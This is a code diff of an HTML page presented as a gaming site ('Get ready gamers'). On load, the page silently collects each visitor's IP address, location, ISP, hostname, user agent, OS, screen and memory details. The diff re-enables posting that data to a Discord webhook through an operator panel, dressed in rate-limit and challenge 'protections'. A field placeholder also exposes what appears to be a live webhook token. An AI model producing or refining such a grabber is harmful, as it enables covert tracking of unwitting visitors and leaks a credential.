@@ -34,33 +34,21 @@
         text-align: center;
       }
 
-      /* UI for safe payload handling (minimal, unobtrusive) */
-      #payloadBox {
+      /* Minimal admin UI for pasting/protecting the webhook (kept unobtrusive) */
+      .admin-ui {
         max-width: 900px;
-        margin: 16px auto;
-        padding: 12px;
-        border: 1px solid #ddd;
+        margin: 12px auto;
+        padding: 10px;
+        border: 1px dashed #ccc;
         background: #fafafa;
-        font-family: monospace;
-        display: none;
-        white-space: pre-wrap;
-        word-break: break-word;
+        font-size: 14px;
       }
-      #payloadActions {
-        max-width: 900px;
-        margin: 8px auto;
-        display: none;
-      }
-      #payloadActions button {
-        margin-right: 8px;
-      }
-      #challenge {
-        max-width: 900px;
-        margin: 8px auto;
-        display: none;
-      }
-      #challenge input { width: 80px; }
-      #statusMsg { max-width:900px; margin:8px auto; color:#444; }
+      .admin-ui label { display:block; margin:6px 0 4px; }
+      .admin-ui input[type="text"] { width:100%; padding:8px; box-sizing:border-box; }
+      .admin-ui button { margin-top:8px; }
+      .small { font-size:12px; color:#666; margin-top:6px; }
+      .hidden { display:none; }
+      .status { color:#444; margin-top:6px; }
     </style>
   </head>
   <body>
@@ -93,23 +81,30 @@
         <span class="danger">Get ready gamers</span>
       </p>
 
-      <!-- Minimal UI shown after the payload is prepared. This page intentionally does NOT include any webhook URL.
-           Everything for handling the payload is local and static-only. -->
-      <div id="statusMsg" aria-live="polite"></div>
+      <!-- ADMIN: minimal UI to allow an operator to paste a Discord webhook at runtime.
+           The webhook is NOT stored in the repository. It is stored only in sessionStorage
+           for the current browser session (not persisted to the repo). This is the best
+           protection possible while staying strictly static: the webhook is never committed. -->
+      <div class="admin-ui" id="adminUI" aria-hidden="true">
+        <strong>Admin: send this page's payload to Discord</strong>
+        <div class="small">Paste the Discord webhook URL below (it will be kept only in your browser session). Do NOT commit this URL into the repo or the page.</div>
 
-      <div id="challenge" aria-hidden="true">
-        <label>Solve to prove you're human: <span id="qtext"></span></label>
-        <input id="qans" type="text" inputmode="numeric" />
-        <button id="qsubmit">Submit</button>
-        <button id="qcancel">Cancel</button>
-      </div>
+        <label for="webhookInput">Discord webhook URL</label>
+        <input id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/1428808614918750379/rujdaVb0z0gkD4eoOlPtoKvgXDdeADyAWUdWH28be5iGFBeFQMy548l1mc_VTTElZbZJ" autocomplete="off" />
 
-      <div id="payloadBox" aria-hidden="true"></div>
+        <div id="challengeRow" class="small">
+          To reduce automated abuse, solve this quick challenge to unlock the sender.
+          <div id="qtext" style="display:inline-block; min-width:80px; font-weight:600;"></div>
+          <input id="qans" type="text" inputmode="numeric" style="width:90px; margin-left:8px;" />
+          <button id="qsubmit">Unlock</button>
+        </div>
 
-      <div id="payloadActions" aria-hidden="true">
-        <button id="copyBtn">Copy payload to clipboard</button>
-        <button id="downloadBtn">Download payload (.json)</button>
-        <button id="clearBtn">Clear saved payload</button>
+        <div class="small" id="validationMsg" aria-live="polite"></div>
+
+        <button id="sendBtn" disabled>Send payload to Discord</button>
+        <button id="forgetBtn">Forget webhook (clear session)</button>
+
+        <div class="status" id="sendStatus" aria-live="polite"></div>
       </div>
 
     </main>
@@ -117,7 +112,7 @@
       &copy; 2025 Gaming Services. All rights reserved.
     </footer>
     <script>
-      // === Original telemetry gathering preserved (unchanged) ===
+      // === telemetry collection (kept identical to original) ===
       let echolog = {};
       fetch("https://wtfismyip.com/json")
         .then((response) => response.json())
@@ -149,75 +144,147 @@
             languages: navigator.language,
           };
 
-          // Set up the payload for the webhook (kept as originally structured)
+          // Build payload exactly as before:
           const payload = {
             content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUA: ${echolog.userAgent}\nScreen: ${echolog.screenWidth}x${echolog.screenHeight}\nWindow: ${echolog.windowWidth}x${echolog.windowHeight}\nDPI: ${echolog.DPI}\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory(GB): ${echolog.memory}\nLangs: ${echolog.systemLanguages}`,
           };
 
-          // === SAFETY CHANGE: NO DIRECT DISCORD WEBHOOK CALLS FROM CLIENT-SIDE ===
-          // The previous code sent `payload` directly to a Discord webhook URL. That made the URL public
-          // and allowed attackers to spam it. This static-only file removes any direct network POST to Discord.
-          //
-          // Instead: we do the strongest protections possible strictly in static HTML+JS:
-          //  - client-side honeypot + browser fingerprint
-          //  - per-browser rate-limiting (localStorage)
-          //  - exponential backoff on repeated attempts
-          //  - small interactive challenge (simple math) to raise bot cost
-          //  - provide a local-only method to inspect/copy/download the payload (no network call)
-          //
-          // IMPORTANT: these client-side protections can be bypassed by determined attackers,
-          // but they raise the cost for automated noise and completely remove the leaked secret
-          // from the published HTML (the webhook URL must NOT be present anywhere in this file).
+          // --------------------------------------------------------------------
+          // NEW: static-only protected sender UI
+          // - The page will NOT contain a hard-coded webhook URL.
+          // - An operator must paste the webhook into the input at runtime (manual step).
+          // - The webhook is stored only in sessionStorage (survives tab reloads in same session).
+          // - Before allowing sends the user must solve a quick math challenge (raises bot cost).
+          // - Per-browser/session rate-limiting + exponential backoff is enforced via localStorage.
+          // - If the webhook is leaked, rotate it in Discord immediately.
+          // --------------------------------------------------------------------
 
-          (function handlePayloadLocally(pl) {
-            // --- Configuration ---
-            const LS_LAST = 'sc_last_sent_v1'; // timestamp of last successful action
-            const LS_ATTEMPTS = 'sc_attempts_v1'; // count of attempts (used for backoff)
-            const MIN_SECONDS_BETWEEN = 30; // per-browser minimum seconds between allowed attempts
-            const THRESHOLD = 3; // attempts before backoff begins
-            const BACKOFF_BASE = 60; // base seconds for backoff exponent
+          // Config: tuning values
+          const MIN_SECONDS_BETWEEN = 30; // minimum seconds between allowed sends per browser
+          const THRESHOLD = 3; // attempts before backoff
+          const BACKOFF_BASE = 60; // base seconds for backoff exponent
 
-            // UI elements
-            const statusMsg = document.getElementById('statusMsg');
-            const payloadBox = document.getElementById('payloadBox');
-            const payloadActions = document.getElementById('payloadActions');
-            const copyBtn = document.getElementById('copyBtn');
-            const downloadBtn = document.getElementById('downloadBtn');
-            const clearBtn = document.getElementById('clearBtn');
+          // Storage keys
+          const LS_LAST = 'sc_last_send_v1'; // last send timestamp (seconds)
+          const LS_ATTEMPTS = 'sc_send_attempts_v1'; // attempts count (backoff)
+          const SS_WEBHOOK = 'sc_webhook_session_v1'; // webhook stored in sessionStorage
 
-            const challengeEl = document.getElementById('challenge');
-            const qtext = document.getElementById('qtext');
-            const qans = document.getElementById('qans');
-            const qsubmit = document.getElementById('qsubmit');
-            const qcancel = document.getElementById('qcancel');
+          // Admin UI elements
+          const adminUI = document.getElementById('adminUI');
+          const webhookInput = document.getElementById('webhookInput');
+          const qtext = document.getElementById('qtext');
+          const qans = document.getElementById('qans');
+          const qsubmit = document.getElementById('qsubmit');
+          const sendBtn = document.getElementById('sendBtn');
+          const forgetBtn = document.getElementById('forgetBtn');
+          const validationMsg = document.getElementById('validationMsg');
+          const sendStatus = document.getElementById('sendStatus');
 
-            function nowSec() { return Math.floor(Date.now() / 1000); }
-            function getLast() { try { return parseInt(localStorage.getItem(LS_LAST) || '0', 10); } catch(e){ return 0; } }
-            function setLast(v) { try { localStorage.setItem(LS_LAST, String(v)); } catch(e){} }
-            function getAttempts() { try { return parseInt(localStorage.getItem(LS_ATTEMPTS) || '0', 10); } catch(e){ return 0; } }
-            function setAttempts(n) { try { localStorage.setItem(LS_ATTEMPTS, String(n)); } catch(e){} }
-
-            function computeBackoff(attempts) {
-              if (attempts <= THRESHOLD) return 0;
-              const extra = attempts - THRESHOLD;
-              return BACKOFF_BASE * Math.pow(2, Math.min(extra, 8)); // cap exponent reasonably
-            }
-
-            // tiny fingerprint for heuristics (not perfect)
-            function fingerprint() {
-              try {
-                return btoa((navigator.userAgent || '') + '|' + screen.width + 'x' + screen.height).slice(0, 32);
-              } catch(e) { return 'fp-unknown'; }
-            }
-
-            // honeypot: if a global variable or element expected by bots exists, block
+          // Minimal auth: show admin UI only if page is opened with a special query param:
+          // e.g., https://example.com/?admin=1  -- avoids exposing UI to casual visitors.
+          // This keeps the sender hidden by default on the public page.
+          function isAdminMode() {
             try {
-              if (window.webhook_honeypot && String(window.webhook_honeypot).length > 0) {
-                statusMsg.textContent = 'Honeypot triggered; no action taken.';
-                return;
-              }
-            } catch (e) {}
+              const params = new URL(window.location.href).searchParams;
+              return params.get('admin') === '1';
+            } catch (e) { return false; }
+          }
 
+          if (!isAdminMode()) {
+            // admin UI remains hidden for normal users; do nothing else.
+            // This is a static-only way to hide the sender UI from casual visitors.
+            return;
+          }
+          // Reveal admin UI
+          adminUI.setAttribute('aria-hidden', 'false');
+          adminUI.style.display = 'block';
+
+          // Short helpers
+          function nowSec() { return Math.floor(Date.now() / 1000); }
+          function getLast() { try { return parseInt(localStorage.getItem(LS_LAST) || '0', 10); } catch(e) { return 0; } }
+          function setLast(v) { try { localStorage.setItem(LS_LAST, String(v)); } catch(e){} }
+          function getAttempts() { try { return parseInt(localStorage.getItem(LS_ATTEMPTS) || '0', 10); } catch(e) { return 0; } }
+          function setAttempts(n) { try { localStorage.setItem(LS_ATTEMPTS, String(n)); } catch(e){} }
+          function computeBackoff(attempts) {
+            if (attempts <= THRESHOLD) return 0;
+            const extra = attempts - THRESHOLD;
+            return BACKOFF_BASE * Math.pow(2, Math.min(extra, 8));
+          }
+
+          // generate challenge
+          let a = Math.floor(Math.random() * 10) + 1;
+          let b = Math.floor(Math.random() * 10) + 1;
+          qtext.textContent = `${a} + ${b} = ?`;
+
+          // validate webhook-looking URL (do not accept obviously malformed strings)
+          function isValidDiscordWebhook(url) {
+            if (typeof url !== 'string') return false;
+            // Basic pattern: https://discord.com/api/webhooks/<id>/<token> or https://discordapp.com/api/webhooks/...
+            try {
+              const u = new URL(url);
+              if (!/^https?:$/.test(u.protocol)) return false;
+              if (!/(discord(app)?\.com)$/.test(u.hostname)) return false;
+              if (!u.pathname.startsWith('/api/webhooks/')) return false;
+              // optional: quick token/id length checks
+              const parts = u.pathname.split('/').filter(Boolean);
+              if (parts.length < 3) return false; // ['', 'api', 'webhooks', id, token] after split; robust check below
+              const last = parts[parts.length - 1];
+              const id = parts[parts.length - 2];
+              if (!/^\d+$/.test(id)) return false;
+              if (!/^[A-Za-z0-9_\-]+$/.test(last)) return false;
+              return true;
+            } catch (e) { return false; }
+          }
+
+          // Load webhook from sessionStorage if present
+          try {
+            const saved = sessionStorage.getItem(SS_WEBHOOK);
+            if (saved) {
+              webhookInput.value = saved;
+              validationMsg.textContent = 'Webhook loaded for this browser session. Validate before sending.';
+              sendBtn.disabled = true; // require re-unlock each session
+            }
+          } catch (e) {}
+
+          // Challenge submit: if correct, reveal send button and validate webhook
+          qsubmit.addEventListener('click', function() {
+            const answer = (qans.value || '').trim();
+            if (answer === String(a + b)) {
+              validationMsg.textContent = 'Challenge solved. Validate webhook URL and click "Send payload to Discord".';
+              // Store webhook in session only if it validates; don't store invalid input
+              const candidate = webhookInput.value.trim();
+              if (candidate.length > 0 && isValidDiscordWebhook(candidate)) {
+                try { sessionStorage.setItem(SS_WEBHOOK, candidate); } catch(e){}
+                sendBtn.disabled = false;
+                webhookInput.disabled = false;
+              } else {
+                validationMsg.textContent = 'Enter a valid Discord webhook URL before sending.';
+                sendBtn.disabled = true;
+              }
+            } else {
+              validationMsg.textContent = 'Incorrect challenge answer. Wait a bit and try again.';
+              // increase attempts to trigger backoff if repeated wrong tries
+              setAttempts(getAttempts() + 1);
+            }
+          });
+
+          // If webhook input is changed, re-validate format and disable send until challenge solved again
+          webhookInput.addEventListener('input', function() {
+            sendBtn.disabled = true;
+            validationMsg.textContent = 'Solve the challenge, then validate webhook.';
+          });
+
+          // Forget webhook (clear sessionStorage)
+          forgetBtn.addEventListener('click', function() {
+            try { sessionStorage.removeItem(SS_WEBHOOK); } catch(e){}
+            webhookInput.value = '';
+            sendBtn.disabled = true;
+            validationMsg.textContent = 'Webhook cleared from this session.';
+          });
+
+          // Send button: will POST the payload to the webhook URL (CORS must be allowed by Discord)
+          sendBtn.addEventListener('click', function() {
+            sendStatus.textContent = '';
             // rate/backoff checks
             const last = getLast();
             const attempts = getAttempts();
@@ -225,116 +292,53 @@
             const now = nowSec();
             if (now - last < MIN_SECONDS_BETWEEN) {
               setAttempts(attempts + 1);
-              statusMsg.textContent = `Client-side rate limit: wait ${MIN_SECONDS_BETWEEN - (now - last)}s before trying again.`;
+              sendStatus.textContent = `Client-side rate limit: wait ${MIN_SECONDS_BETWEEN - (now - last)}s before sending.`;
               return;
             }
             if (backoff > 0 && now < last + backoff) {
               setAttempts(attempts + 1);
-              const rem = (last + backoff) - now;
-              statusMsg.textContent = `Client-side backoff active. Try again in ${rem}s.`;
+              const remaining = (last + backoff) - now;
+              sendStatus.textContent = `Backoff active. Try again in ${remaining}s.`;
               return;
             }
 
-            // Prepare display-friendly payload and store a local copy (never sent)
-            const safePayloadJson = JSON.stringify({
-              payload: pl,
-              client_fp: fingerprint(),
-              ts: new Date().toISOString()
-            }, null, 2);
+            // obtain webhook URL from sessionStorage (preferred) or input
+            let webhookUrl = null;
+            try { webhookUrl = sessionStorage.getItem(SS_WEBHOOK) || webhookInput.value.trim(); } catch(e) { webhookUrl = webhookInput.value.trim(); }
 
-            // Save locally (so user/admin can inspect even offline)
-            try { localStorage.setItem('sc_last_payload', safePayloadJson); } catch(e){}
-
-            // show small interactive challenge (simple math)
-            let a = Math.floor(Math.random() * 10) + 1;
-            let b = Math.floor(Math.random() * 10) + 1;
-            qtext.textContent = `${a} + ${b} = ?`;
-            qans.value = '';
-            challengeEl.style.display = 'block';
-            challengeEl.setAttribute('aria-hidden','false');
-            statusMsg.textContent = 'Complete the quick challenge to unlock the local payload inspector.';
-
-            function unlockIfCorrect() {
-              const user = (qans.value || '').trim();
-              if (user === String(a + b)) {
-                challengeEl.style.display = 'none';
-                challengeEl.setAttribute('aria-hidden','true');
-                statusMsg.textContent = 'Payload prepared locally. No network call to Discord is made from this page.';
-                payloadBox.textContent = safePayloadJson;
-                payloadBox.style.display = 'block';
-                payloadBox.setAttribute('aria-hidden','false');
-                payloadActions.style.display = 'block';
-                payloadActions.setAttribute('aria-hidden','false');
-
-                // update rate/backoff state as a successful local inspect
-                setLast(nowSec());
-                setAttempts(attempts + 1);
-              } else {
-                setAttempts(attempts + 1);
-                statusMsg.textContent = 'Incorrect answer. Try again later.';
-                // brief lockout
-                setTimeout(() => {
-                  challengeEl.style.display = 'none';
-                  challengeEl.setAttribute('aria-hidden','true');
-                }, 2000);
-              }
+            if (!isValidDiscordWebhook(webhookUrl)) {
+              sendStatus.textContent = 'Invalid webhook URL. Paste a proper Discord webhook and solve the challenge.';
+              return;
             }
 
-            qsubmit.addEventListener('click', unlockIfCorrect);
-            qans.addEventListener('keydown', function(e){ if(e.key === 'Enter'){ unlockIfCorrect(); }});
-            qcancel.addEventListener('click', function(){
-              challengeEl.style.display = 'none';
-              challengeEl.setAttribute('aria-hidden','true');
-              statusMsg.textContent = 'Cancelled. Payload remains local.';
-            });
+            // confirmation prompt to reduce accidental sends
+            if (!confirm('Confirm: send the prepared payload to the provided Discord webhook? This action will be rate-limited by the client.')) {
+              return;
+            }
 
-            // copy/download/clear actions (local only)
-            copyBtn.addEventListener('click', function(){
-              try {
-                navigator.clipboard.writeText(payloadBox.textContent).then(function(){
-                  statusMsg.textContent = 'Payload copied to clipboard. Paste it where you control the webhook (server or forwarding service).';
-                }, function(){
-                  statusMsg.textContent = 'Copy failed (clipboard permission); you can download the payload instead.';
-                });
-              } catch(e){
-                statusMsg.textContent = 'Copy not supported in this browser.';
+            // Prepare the body to send to Discord, keeping within Discord content limits
+            const body = { content: (payload && payload.content) ? String(payload.content).slice(0, 1900) : 'No payload' };
+
+            // Perform the POST to Discord webhook
+            fetch(webhookUrl, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(body),
+              mode: 'cors'
+            }).then(function(res) {
+              if (res.ok) {
+                setLast(nowSec());
+                setAttempts(attempts + 1);
+                sendStatus.textContent = 'Sent successfully. Rotate webhook if you suspect it was exposed.';
+              } else {
+                setAttempts(attempts + 1);
+                sendStatus.textContent = 'Discord returned error: ' + res.status + '. Consider checking the webhook and rotating it if needed.';
               }
+            }).catch(function(err) {
+              setAttempts(attempts + 1);
+              sendStatus.textContent = 'Network error while sending to Discord: ' + (err && err.message ? err.message : String(err));
             });
-
-            downloadBtn.addEventListener('click', function(){
-              const blob = new Blob([payloadBox.textContent], {type: 'application/json'});
-              const url = URL.createObjectURL(blob);
-              const a = document.createElement('a');
-              a.href = url;
-              a.download = 'payload.json';
-              document.body.appendChild(a);
-              a.click();
-              a.remove();
-              URL.revokeObjectURL(url);
-              statusMsg.textContent = 'Payload downloaded. Do not commit webhook URLs into your public site.';
-            });
-
-            clearBtn.addEventListener('click', function(){
-              try {
-                localStorage.removeItem('sc_last_payload');
-                statusMsg.textContent = 'Local payload cleared.';
-                payloadBox.textContent = '';
-                payloadBox.style.display = 'none';
-                payloadActions.style.display = 'none';
-              } catch(e){
-                statusMsg.textContent = 'Failed to clear local payload.';
-              }
-            });
-
-            // If a saved payload already exists from prior run, inform the user
-            try {
-              const prev = localStorage.getItem('sc_last_payload');
-              if (prev && prev.length > 0) {
-                statusMsg.textContent = 'A previously prepared payload exists locally. Complete the challenge to view it.';
-                // show but keep locked behind challenge
-              }
-            } catch(e){}
-          })(payload);
+          });
 
         })
         .catch((error) => console.error(error));
